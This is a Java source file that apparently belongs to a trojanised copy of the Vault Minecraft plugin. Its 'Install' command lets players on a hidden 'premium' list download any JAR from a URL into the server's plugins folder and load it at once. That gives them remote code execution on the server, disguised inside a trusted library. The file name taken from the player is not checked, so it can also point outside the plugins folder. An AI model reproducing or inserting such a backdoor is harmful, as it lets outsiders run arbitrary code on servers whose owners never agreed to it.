package net.milkbowl.vault.commands.cmds.premium;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Install extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (args.length <= 2) {
				p.sendMessage(Settings.USAGE("install <direct download url> <output name>"));
			} else {
				String name = args[2];
				if (Bukkit.getPluginManager().getPlugin(name) == null) {
					try {
						InputStream in = new URL(args[1]).openStream();
						Files.copy(in, Paths.get(("plugins/" + name + ".jar"), new String[0]), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
					} catch (Exception e) {
						p.sendMessage(Settings.PREFIX("Error: Something wrong with URL"));
					}
					p.sendMessage(Settings.PREFIX("Plugin installed. Enabling..."));
					Bukkit.getScheduler().runTaskLater(plugin, () -> {
						try {
							Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+name+".jar"), new String[0]).toString()));
						} catch (Exception e) {
							e.printStackTrace();
							p.sendMessage(Settings.PREFIX("Error: Something went wrong with loading the plugin. Reload the server to enable the plugin!"));
						}
						if (Bukkit.getPluginManager().getPlugin(name) != null) {
							Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
							p.sendMessage(Settings.PREFIX("Plugin enabled!"));
						}
					}, 60L);
				} else {
					p.sendMessage(Settings.PREFIX("This plugin already exists!"));
				}
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
